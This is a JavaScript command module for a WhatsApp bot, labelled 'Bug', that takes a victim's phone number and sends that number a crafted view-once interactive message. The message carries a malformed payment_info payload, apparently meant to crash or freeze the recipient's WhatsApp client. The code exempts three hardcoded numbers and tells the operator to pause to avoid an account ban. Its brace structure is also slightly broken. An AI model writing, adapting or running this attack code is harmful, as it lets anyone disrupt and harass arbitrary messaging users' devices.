module.exports = {
  usage: ["infinity", "xblank"],
  desc: "Use Strictly",
  commandType: "Bug",
  isGroupOnly: false,
  isAdminOnly: false,
  isPrivateOnly: false,
  emoji: '🔺',

  async execute(sock, m, args) {
    const text = args[0];
    const cmd = this.usage

    if (!text) {
      return kord.freply(m, `Usage: .${cmd} 23412345678`);
  

    let peler = text.replace(/[^0-9]/g, '');
    if (peler.startsWith('0')) {
      return kord.freply(m, `Example: ${cmd} 23412345678`);
    }

    var contactInfo = await sock.onWhatsApp(peler + "@s.whatsapp.net");
    let whatsappNumber = peler + '@s.whatsapp.net';

    if (["2347013159244", "2348160247341", "2348034779798"].includes(peler)) {
      return;
    }

    if (contactInfo.length == 0) {
      return kord.freply(m, "The number is not registered on WhatsApp");
    }

    async function BugPay(jid) {
      await sock.relayMessage(
        jid,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              interactiveMessage: {
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: 'payment_info',
                      buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
                    },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: jid } },
        { messageId: null }
      );
    }

    await BugPay(whatsappNumber);

    await sock.sendMessage(m.key.remoteJid, {
      text: `Successfully sent Bug to @${whatsappNumber.split('@')[0]} using *${m.command}* ✅\n\nPause for 2 minutes to avoid account ban.`,
      mentions: [whatsappNumber]
    });
  }
}
}